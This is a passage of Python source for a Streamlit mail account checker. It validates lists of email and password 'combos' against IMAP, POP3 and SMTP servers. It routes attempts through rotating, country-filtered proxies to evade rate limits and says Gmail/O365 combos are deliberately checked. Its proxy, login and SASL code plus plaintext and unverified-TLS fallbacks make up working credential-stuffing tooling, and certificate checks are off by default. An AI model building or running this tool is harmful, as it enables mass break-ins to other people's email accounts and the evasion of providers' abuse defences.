    str_lit.session_state.pool_pick = None

selected_countries = list(str_lit.session_state.picked_countries)
selected_mix_countries = list(str_lit.session_state.picked_countries)
pool_mode = str_lit.session_state.pool_mode

if str_lit.session_state.pool_locked:
    str_lit.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        str_lit.sidebar.caption("Picked: " + ", ".join(str_lit.session_state.picked_countries))
    if str_lit.sidebar.button("Change pool"):
        str_lit.session_state.pool_locked = False
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
else:
    str_lit.sidebar.caption("Tap one")
    for _lbl, _mode in (("all", "all"), ("us_only", "us_only"),
                        ("country", "country"), ("mix", "mix")):
        if str_lit.sidebar.button(_lbl, key=f"pool_btn_{_mode}"):
            if _mode in ("country", "mix"):
                str_lit.session_state.pool_pick = _mode
            else:
                str_lit.session_state.pool_mode = _mode
                str_lit.session_state.pool_locked = True
                str_lit.session_state.pool_pick = None
            str_lit.rerun()
    choice = str_lit.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores() or ["US"]
        with str_lit.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                label = c
                if choice == "mix":
                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in load_proxies()
                              if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                    label = f"{c}  score={max(scores) if scores else 0}"
                if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries,
                                    key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if str_lit.form_submit_button("Done"):
                if not picked:
                    str_lit.sidebar.error("Pick at least one country")
                else:
                    str_lit.session_state.pool_mode = choice
                    str_lit.session_state.picked_countries = picked
                    str_lit.session_state.pool_locked = True
                    str_lit.session_state.pool_pick = None
                    str_lit.rerun()
# @@END 052 CACHE_PROXY_PARSE_PICKER

# @@BLOCK 053 SIDEBAR_SWITCHES deps=043,044,051
str_lit.sidebar.markdown("---")

use_proxy = instant_help(
    "use_proxy",
    "Route all checker requests through proxy nodes to prevent IP rate-limiting. "
    "UNCHECK for a fully direct connection.",
    "Use Proxy", widget_type="checkbox", value=True)
retry_cf = instant_help(
    "retry_cf",
    "After the proxy route fails with a NETWORK error, make one extra pass with a "
    "direct connection.",
    "Retry CF (Direct Retry)", widget_type="checkbox", value=True)
self_signed = instant_help(
    "self_signed",
    "REAL switch. TICKED (default) = accept self-signed / mismatched certs, no "
    "verification attempted. UNTICKED = VERIFY, and if verification fails the handshake "
    "is retried unverified - unless TLS_STRICT is on, in which case the failure is raised "
    "so a bad cert is actually rejected.",
    "Allow Self-Signed", widget_type="checkbox", value=True)
proxy_test_flight = instant_help(
    "proxy_test_flight",
    "Probe every proxy for liveness before it enters the live pool. KEEP THIS ON - it is "
    "what makes Fetch & Test produce a pool that actually works.",
    "Test Flight", widget_type="checkbox", value=True)
skip_app = instant_help(
    "skip_app",
    "Filter out accounts requiring explicit app passwords or token generation upfront. "
    "OFF by default so Gmail/O365 combos are actually CHECKED rather than bucketed away.",
    "Skip Strict App-Only Providers", widget_type="checkbox", value=False)
debug_mode = instant_help(
    "debug_mode",
    "Stream verbose logs and error tracing directly into the UI interface.",
    "Enable Debug Mode", widget_type="checkbox", value=True)

# instant_help() returns None when its internal try/except fires, and `not None` is
# True - which silently flips ALLOW_SELF_SIGNED to False and turns verification ON
# behind your back, in build_cfg()'s "TLS_STRICT": not self_signed.
self_signed = True if self_signed is None else self_signed

try_starttls_ui = str_lit.sidebar.toggle(
    "Enable STARTTLS + plaintext fallback (143 / 110)", value=True, key="ui_starttls",
    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over "
         "plaintext. These rungs get a shorter leash (LEGACY_RUNG_TIMEOUT) because "
         "143/110 are often firewalled from cloud egress."
)

resolved_proxy_mode = str_lit.sidebar.selectbox(
    "Proxy Mode Engine:", options=["aggressive", "fallback", "sticky", "off"], index=1,
    key="ui_proxy_mode",
    help="aggressive: proxy only. fallback: proxy then direct (default, universal). "
         "sticky: one proxy per worker thread. off: never use proxies. With a "
         "provider-wide 407, 'off' is the only mode that can finish a run."
)
# @@END 053 SIDEBAR_SWITCHES

# @@BLOCK 054 BUILD_CFG deps=011,020,046,047,048,049,050,051,052,053
def build_cfg():
    return {
        "MODE_NAME": engine_config.mode_name,
        "PROTOCOLS": list(protocol_pick or PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": workers,
        "MAX_WORKERS_MAX": max(workers * 2, engine_config.max_concurrent_checks),
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": resolved_proxy_mode if use_proxy else "off",
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        # unticking "Allow Self-Signed" means STRICT - no silent fallback to unverified.
        "TLS_STRICT": not self_signed,
        "TRY_STARTTLS": try_starttls_ui,
        "TRY_ALT_USERNAME": try_alt_username_ui,
        "CONFIRM_WRONG_ACROSS_HOSTS": confirm_wrong_ui,
        "MAX_HOSTS_PER_DOMAIN": max_hosts_per_domain,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "PROBE_TIMEOUT": probe_timeout_ui,
        "PROBE_TARGET": probe_target_ui,
        "PROBE_STRICT": probe_strict_ui,
        "PROBE_MAX_TARGETS": probe_max_targets_ui,
        "PROBE_SECOND_SCHEME": probe_second_scheme_ui,
        "PROBER_IDLE_ENABLED": prober_idle_ui,
        "PROBE_SAMPLE_MAX": probe_sample_ui,
        "MAIL_SPOT_CHECK": mail_spot_ui,
        "DEDUPE_PROXIES": dedupe_proxies_ui,
        "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
        "QUARANTINE_407": proxy_quarantine_ui,
        "HOST_CONCURRENCY": host_concurrency_ui,
        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,
        "PROXY_SUBUSER_CONCURRENCY": proxy_subuser_concurrency_ui,
        "PROXY_CONCURRENCY": proxy_concurrency_ui,
        "DIRECT_FIRST": direct_first_ui,
        "SAME_HOST_RETRIES": same_host_retries_ui,
        "MAX_ROTATIONS": max_rotations_ui,
        "CHECK_PASS2": pass2_ui,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": "mail_results",
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode,
        "FAILURE_COOLDOWN": engine_config.failure_cooldown,
        "RANDOM_ROTATION": proxy_random_rotation,
        "GEO_CALL": geo_call_proxy,
        "CONNECTION_HINT": my_connection,
        "SMTP_CHECK": smtp_precheck_ui,
    }
# @@END 054 BUILD_CFG

# @@BLOCK 055 APPLY_SETTINGS deps=020,040,054
if "applied_cfg" not in str_lit.session_state:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
elif str_lit.session_state.get("applied_cfg_version") != CFG_VERSION:
    _migrated = build_cfg()
    str_lit.session_state.applied_cfg = _migrated
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    log_startup(f"Config migrated to v{CFG_VERSION} defaults "
                f"(untouched widgets adopted the new defaults).")

_settings_dirty = build_cfg() != str_lit.session_state.applied_cfg
if _settings_dirty:
    str_lit.sidebar.warning("⚠ You have UNAPPLIED settings changes. Click 💾 Apply Settings.")

_btn_c1, _btn_c2 = str_lit.sidebar.columns(2)
with _btn_c1:
    _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", use_container_width=True)
with _btn_c2:
    _reset_clicked = str_lit.button(
        "♻️ Reset Defaults", use_container_width=True,
        help="Restore every setting to the universal default (protocols back to IMAP + POP3).")

if _reset_clicked:
    str_lit.session_state["_bb_reset_pending"] = True
    str_lit.rerun()

if _apply_clicked:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    _reset_gates()
    str_lit.sidebar.success("Settings applied successfully!")
    log_startup("User applied new configuration settings via sidebar control panel.")
    str_lit.rerun()

CFG = str_lit.session_state.applied_cfg

for _k, _v in (
    ("ALLOW_SELF_SIGNED", True), ("TLS_STRICT", False), ("TRY_STARTTLS", True),
    ("TRY_ALT_USERNAME", True), ("CONFIRM_WRONG_ACROSS_HOSTS", True),
    ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL),
    ("ACCOUNT_DEADLINE", DEADLINE_NORMAL), ("PROXY_CONNECT_TIMEOUT", 8.0),
    ("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT),
    ("FAST_MODE", False), ("BLACKLIST_CF", BLACKLIST_CF_DEFAULT), ("DEBUG", False),
    ("PROXY_TEST_FLIGHT", True),
    ("RETRY_CONNECTION_FAILED", 1), ("MAX_ACCOUNTS", 5000),
    ("MAX_WORKERS_START", WORKERS_NORMAL),
    ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"),
    ("ALLOW_BLACKLIST_IPS", False),
    ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"),
    ("SMTP_CHECK", False),
    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT),
    ("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT),
    ("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT), ("PROBE_TARGET", PROBE_TARGET_DEFAULT),
    ("PROBE_STRICT", PROBE_STRICT_DEFAULT), ("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT),
    ("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT),
    ("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT),
    ("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT),
    ("PROBE_SAMPLE_MAX", 0),
    ("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT),
    ("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT),
    ("CHECK_PASS2", CHECK_PASS2_DEFAULT),
    ("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT),
    ("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT),
    ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
    ("PROXY_SUBUSER_CONCURRENCY", PROXY_SUBUSER_CONCURRENCY_DEFAULT),
    ("DIRECT_FIRST", False), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
    ("SKIP_STRICT_APP_PROVIDERS", False),
    ("PROTOCOLS", list(PROTOCOL_SELECTION_DEFAULT)),
):
    CFG.setdefault(_k, _v)

log_startup(
    f"ACTIVE CONFIG -> protocols={CFG.get('PROTOCOLS')} mode={CFG.get('MODE_NAME')} "
    f"workers={CFG.get('MAX_WORKERS_START')} "
    f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
    f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
    f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
    f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} tls_strict={CFG.get('TLS_STRICT')} "
    f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
    f"smtp_precheck={CFG.get('SMTP_CHECK')} quarantine_407={CFG.get('QUARANTINE_407')} "
    f"probe_target={CFG.get('PROBE_TARGET')} probe_timeout={CFG.get('PROBE_TIMEOUT')}s "
    f"probe_strict={CFG.get('PROBE_STRICT')} dedupe={CFG.get('DEDUPE_PROXIES')} "
    f"probe_max_targets={CFG.get('PROBE_MAX_TARGETS')} "
    f"probe_scheme2={CFG.get('PROBE_SECOND_SCHEME')} "
    f"prober_idle={CFG.get('PROBER_IDLE_ENABLED')} "
    f"probe_sample={CFG.get('PROBE_SAMPLE_MAX')} mail_spot={CFG.get('MAIL_SPOT_CHECK')} "
    f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
    f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
    f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
    f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
    f"direct_first={CFG.get('DIRECT_FIRST')} same_host_retries={CFG.get('SAME_HOST_RETRIES')}"
)
# @@END 055 APPLY_SETTINGS

# @@BLOCK 056 THEME_STUDIO deps=031,055
with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
    th = str_lit.session_state.theme

    _preset_names = list(THEME_PRESETS.keys())
    _seed = {
        "th_preset": th.get("preset", "Aurora") if th.get("preset", "Aurora") in _preset_names else "Aurora",
        "th_g1": th["g1"], "th_g2": th["g2"],
        "th_accent": th["accent"], "th_accent2": th["accent2"],
        "th_bg": th["bg"], "th_panel": th["panel"], "th_text": th["text"],
        "th_radius": int(th.get("radius", 14)),
        "th_glow": bool(th.get("glow", True)),
        "th_glass": bool(th.get("glass", True)),
        "th_animate": bool(th.get("animate", True)),
        "th_hero_title": th.get("hero_title", ""),
        "th_hero_sub": th.get("hero_sub", ""),
    }
    for _k, _v in _seed.items():
        if _k not in str_lit.session_state:
            str_lit.session_state[_k] = _v

    str_lit.selectbox("Preset Gradient", _preset_names, key="th_preset",
                      on_change=_on_preset_change)

    c_a, c_b = str_lit.columns(2)
    with c_a:
        str_lit.color_picker("Gradient Start", key="th_g1")
        str_lit.color_picker("Accent", key="th_accent")
        str_lit.color_picker("Page Background", key="th_bg")
    with c_b:
        str_lit.color_picker("Gradient End", key="th_g2")
        str_lit.color_picker("Accent 2", key="th_accent2")
        str_lit.color_picker("Panel Surface", key="th_panel")

    str_lit.color_picker("Body Text", key="th_text")
    str_lit.slider("Corner Radius", 0, 28, key="th_radius")

    t_a, t_b = str_lit.columns(2)
    with t_a:
        str_lit.toggle("Neon Glow", key="th_glow")
        str_lit.toggle("Glass Blur", key="th_glass")
    with t_b:
        str_lit.toggle("Animated Gradient", key="th_animate")
        str_lit.toggle("Colourised Logs", key="colorize_logs")

    str_lit.text_input("Hero Title", key="th_hero_title")
    str_lit.text_input("Hero Subtitle", key="th_hero_sub")

    b_a, b_b = str_lit.columns(2)
    with b_a:
        str_lit.button("♻️ Reset Theme", on_click=_reset_theme, use_container_width=True)
    with b_b:
        str_lit.download_button(
            "⬇️ Export Theme",
            data=json.dumps(str_lit.session_state.theme, indent=2),
            file_name="theme.json", mime="application/json",
            use_container_width=True,
        )

    _sync_theme_from_widgets()
# @@END 056 THEME_STUDIO

# @@BLOCK 057 BOOT_RENDER deps=033,034,055,056
_theme = str_lit.session_state.theme

str_lit.markdown(theme_css(_theme), unsafe_allow_html=True)
render_hero(_theme)

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
except Exception as e:
    log_startup(f"WARNING: Failed to create results directory: {e}")
# @@END 057 BOOT_RENDER

# @@BLOCK 058 FILE_IO deps=039,052
def save_domain_cache():
    try:
        with file_write_lock:
            with cache_lock:
                with open(CFG["CACHE_FILE"], "w", encoding="utf-8") as f:
                    json.dump(domain_cache, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save domain cache: {e}")


def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(CFG["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save proxy meta: {e}")


def proxy_is_blocked(proxy_str):
    if not proxy_str:
        return False
    if CFG.get("ALLOW_BLACKLIST_IPS", False):
        return False
    try:
        if proxy_str in circuit_breaker_until and time.time() < circuit_breaker_until[proxy_str]:
            return True
    except Exception:
        pass
    return False


def get_filtered_active_proxies(quiet: bool = False):
    """The pool the engine is allowed to use.  NO silent fallback to the raw list."""
    try:
        raw = load_proxies(quiet=quiet)
        if not raw:
            return []
        try:
            dedupe = bool(CFG.get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            raw = list(dict.fromkeys(raw))
        filtered = []
        min_score = CFG.get("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT)
        mode = CFG.get("POOL_MODE", "all")
        chosen_countries = CFG.get("SELECTED_COUNTRIES", [])
        chosen_mix = CFG.get("SELECTED_MIX_COUNTRIES", [])

        with proxy_lock:
            meta_snapshot = dict(proxy_meta)

        for p in raw:
            if proxy_is_blocked(p):
                continue
            meta = meta_snapshot.get(p, {})
            if meta.get("score", 50) < min_score:
                continue
            country = str(meta.get("country", "Unknown")).upper()
            if mode == "all":
                filtered.append(p)
            elif mode == "us_only":
                if "US" in country or "UNITED STATES" in country:
                    filtered.append(p)
            elif mode == "country":
                if any(cc in country or cc in p.upper() for cc in chosen_countries):
                    filtered.append(p)
            elif mode == "mix":
                if any(mc in country or mc in p.upper() for mc in chosen_mix):
                    filtered.append(p)
            else:
                filtered.append(p)

        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} "
                    f"of {len(raw)} candidate(s) (score/geo filter).", quiet=quiet)
        if not filtered:
            log_startup("WARNING: every candidate was filtered out (min score / pool mode / "
                        "circuit breaker). Returning an EMPTY pool - the raw list is NOT "
                        "used as a silent fallback.", quiet=quiet)
            log_probe_event("proxy filter emptied the pool -> 0 candidates (no raw fallback)")
        return filtered
    except Exception as e:
        log_startup(f"WARNING: Error filtering active proxies: {e}", quiet=quiet)
        return load_proxies(quiet=quiet)


all_proxies = load_proxies()
filtered_pool = get_filtered_active_proxies()
# @@END 058 FILE_IO

# @@BLOCK 059 DNS_CACHE deps=024
_DNS_CACHE = STATE.setdefault("dns_cache", {})
_DNS_TTL = 300.0


def _resolve_cached(host, ttl=_DNS_TTL):
    """Cached gethostbyname.  Returns the IP string, or None on failure."""
    h = (host or "").strip().lower()
    if not h:
        return None
    now = time.time()
    with _host_dns_lock:
        hit = _DNS_CACHE.get(h)
        if hit and (now - hit[0]) < ttl:
            return hit[1]
    try:
        ip = socket.gethostbyname(h)
    except Exception:
        ip = None
    with _host_dns_lock:
        _DNS_CACHE[h] = (now, ip)
    return ip


def fast_fail_dns_check(host):
    return _resolve_cached(host) is not None


def _dedupe_hosts_by_ip(hosts, cap=3):
    out, seen_ips = [], set()
    for h in hosts:
        if not h or h in out:
            continue
        ip = _resolve_cached(h) or ("?" + h)
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        out.append(h)
        if len(out) >= cap:
            break
    if len(out) < cap:
        for h in hosts:
            if len(out) >= cap:
                break
            if h and h not in out:
                out.append(h)
    return out
# @@END 059 DNS_CACHE

# @@BLOCK 060 PROXY_CONNECT deps=022,023,059
def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
    """Open a tunnel.  This is ALWAYS a proxy hop."""
    base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
    effective_timeout = max(3.0, base_timeout - (fails * 0.1))
    leg_to = max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6)
    read_to = max(READ_FLOOR_DEFAULT, effective_timeout * 0.9)

    if not proxy_str or proxy_str == "direct":
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port),
                                     timeout=max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(read_to)
        return s

    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        raise RuntimeError("bad proxy format or socks unavailable")

    last_err = None
    auth_schemes = set()
    for ptype in _scheme_order(proxy_str):
        try:
            kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                  "proxy_port": info["port"], "proxy_rdns": remote_dns}
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            s = socks.create_connection((host, port), timeout=leg_to, **kw)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(read_to)
            _remember_scheme(proxy_str, ptype)
            return s
        except Exception as proxy_ex:
            last_err = proxy_ex
            if _is_proxy_auth_fail(str(proxy_ex)):
                auth_schemes.add(ptype)

    if auth_schemes:
        raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {last_err}")

    raise ProxyTransportError(f"Proxy tunnel transport failure for {host}:{port}: {last_err}")
# @@END 060 PROXY_CONNECT

# @@BLOCK 061 TLS_LAYER deps=023,059,060
def _tls_context(host: str, verify: bool):
    if verify:
        ctx = ssl.create_default_context()
    else:
        ctx = ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception:
        pass
    return ctx


def _raw_socket(host, port, proxy_str=None, timeout=None):
    t = timeout or CFG["TIMEOUT"]
    read_to = max(READ_FLOOR_DEFAULT, t * 0.9)
    if proxy_str and proxy_str != "direct":
        s = proxy_connect(host, port, proxy_str, timeout=t)
    else:
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, t * 0.6))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(read_to)
    return s


def tls_connect(host, port, proxy_str=None, insecure=None, timeout=None):
    """ALLOW_SELF_SIGNED is a REAL switch, and TLS_STRICT is read.

    insecure=None means "read ALLOW_SELF_SIGNED from CFG", so every caller -
    including the Mailbox Reader - honours the checkbox.
    """
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    if insecure:
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)

    raw = _raw_socket(host, port, proxy_str, timeout)
    try:
        return _tls_context(host, True).wrap_socket(raw, server_hostname=host)
    except ssl.SSLError as e:
        if CFG.get("TLS_STRICT", False):
            warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                          f"TLS_STRICT is ON so NOT falling back")
            raise
        warnings.warn(f"Verified TLS failed for {host} ({e!r}); "
                      f"retrying unverified on a FRESH socket")
        return _tls_context(host, False).wrap_socket(
            _raw_socket(host, port, proxy_str, timeout), server_hostname=host)
# @@END 061 TLS_LAYER

# @@BLOCK 062 PX_TAG deps=052
def px_tag(proxy_str):
    if not proxy_str or proxy_str == "direct":
        g = direct_geo()
        return f"direct | {g['ip']} | {g['region']} | {g['country']} | {g['vpn']}"
    info = parse_proxy(proxy_str)
    if not info:
        return "proxy"
    meta = proxy_meta.get(proxy_str, {})
    q = " [QUARANTINED]" if proxy_is_quarantined(proxy_str) else ""
    who = f"{info.get('user')}@" if info.get("user") else ""
    return f"{who}{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}{q}"
# @@END 062 PX_TAG

# @@BLOCK 063 PROTOCOL_CLIENTS deps=061
class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
    def __init__(self, host, port=993, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyIMAP4(imaplib.IMAP4):
    def __init__(self, host, port=143, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


class ProxyPOP3SSL(poplib.POP3_SSL):
    def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=None):
        self._proxy_str = proxy_str
        self._insecure = insecure
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return tls_connect(self.host, self.port, self._proxy_str,
                           insecure=self._insecure, timeout=timeout)


class ProxyPOP3(poplib.POP3):
    def __init__(self, host, port=110, timeout=None, proxy_str=None):
        self._proxy_str = proxy_str
        super().__init__(host, port, timeout=timeout)

    def _create_socket(self, timeout):
        return _raw_socket(self.host, self.port, self._proxy_str, timeout)


def pop3_ok(resp):
    if resp is None:
        return False
    if isinstance(resp, (bytes, bytearray)):
        return bytes(resp).lstrip().startswith(b"+")
    if isinstance(resp, str):
        return resp.lstrip().startswith("+")
    if isinstance(resp, (tuple, list)):
        return len(resp) >= 1
    return True
# @@END 063 PROTOCOL_CLIENTS

# @@BLOCK 064 IMAP_SASL deps=063
def _imap_caps(mail) -> set:
    """UPPERCASE capability tokens as a set of str.  Never raises.  Cached."""
    cached = getattr(mail, "_venice_caps", None)
    if cached is not None:
        return cached
    out = set()
    try:
        raw = getattr(mail, "capabilities", None)
        if raw is None:
            raw = ()
        if isinstance(raw, (str, bytes, bytearray)):
            raw = (raw,)
        for c in raw:
            if c is None:
                continue
            if isinstance(c, bytes):
                out.update(c.decode("ascii", "ignore").upper().split())
            elif isinstance(c, bytearray):
                out.update(bytes(c).decode("ascii", "ignore").upper().split())
            else:
                out.update(str(c).upper().split())
        if not out:
            try:
                typ, dat = mail.capability()
                if typ == "OK":
                    for c in (dat or []):
                        if c is None:
                            continue
                        if isinstance(c, (bytes, bytearray)):
                            out.update(bytes(c).decode("ascii", "ignore").upper().split())
                        else:
                            out.update(str(c).upper().split())
            except Exception:
                pass
    except Exception:
        out = set()
    try:
        mail._venice_caps = out
    except Exception:
        pass
    return out


def _imap_wants_plain(mail) -> bool:
    """True when the server will not accept the LOGIN command."""
    caps = _imap_caps(mail)
    if not caps:
        return False
    if "LOGINDISABLED" in caps:
        return True
    if "AUTH=PLAIN" in caps and "AUTH=LOGIN" not in caps:
        return True
    return False


def _imap_authenticate_plain(mail, user, password):
    """SASL PLAIN via AUTHENTICATE.  imaplib base64-encodes whatever we return,
    so the payload must be RAW."""
    raw = ("\0" + user + "\0" + password).encode("utf-8")
    mail.authenticate("PLAIN", lambda _challenge: raw)


def _imap_auth(mail, user, password):
    """LOGIN, or AUTHENTICATE PLAIN when the server disables LOGIN."""
    user = (user or "").strip()
    password = (password or "").strip()

    if _imap_wants_plain(mail):
        try:
            _imap_authenticate_plain(mail, user, password)
            return
        except imaplib.IMAP4.abort:
            raise
        except imaplib.IMAP4.error as e:
            msg = str(e).lower()
            if any(k in msg for k in ("authenticationfailed", "invalid credentials",
                                      "authentication failed", "login failed",
                                      "auth failed", "bad credentials")):
                raise
            try:
                mail.state = "NONAUTH"
            except Exception:
                pass

    typ, data = mail.login(user, password)
    if typ != "OK":
        raise RuntimeError(f"IMAP login returned non-OK status: {typ} {data}")
# @@END 064 IMAP_SASL

# @@BLOCK 065 SMTP_AUTH deps=023,061
_HELO_STATE = STATE["helo_name"]


def smtp_helo_name() -> str:
    now = time.time()
    if _HELO_STATE.get("name") and now - _HELO_STATE.get("ts", 0.0) < 3600:
        return _HELO_STATE["name"]
    with STATE["helo_lock"]:
        if _HELO_STATE.get("name") and time.time() - _HELO_STATE.get("ts", 0.0) < 3600:
            return _HELO_STATE["name"]
        name = ""
        try:
            name = socket.getfqdn() or ""
        except Exception:
            name = ""
        if "." not in name:
            ip = public_ip()
            if ip and ip != "Unknown":
                name = f"[{ip}]"
        if not name:
            name = "localhost"
        _HELO_STATE.update(name=name, ts=time.time())
        return name


def _smtp_read_reply(sock, limit=24) -> str:
    lines = []
    for _ in range(limit):
        buf = b""
        while not buf.endswith(b"\n"):
            try:
                chunk = sock.recv(1)
            except Exception:
                chunk = b""
            if not chunk:
                break
            buf += chunk
        if not buf:
            break
        text = buf.decode("utf-8", errors="ignore").rstrip("\r\n")
        lines.append(text)
        if len(text) >= 4 and text[3] == "-":
            continue
        break
    return "\n".join(lines)


def _smtp_cmd(sock, cmd, quiet=False) -> str:
    try:
        sock.sendall((cmd + "\r\n").encode())
    except Exception:
        if not quiet:
            raise
        return ""
    try:
        return _smtp_read_reply(sock)
    except Exception:
        if quiet:
            return ""
        raise


def smtp_auth_once(email, password, server, proxy_str=None, insecure=None, port=587,
                   attempt_timeout=None, user=None):
    """Confirm-only SMTP submission AUTH.  Raises SmtpAuthError ONLY on a clean 535."""
    if insecure is None:
        insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
    to = attempt_timeout or CFG["TIMEOUT"]
    s = None
    try:
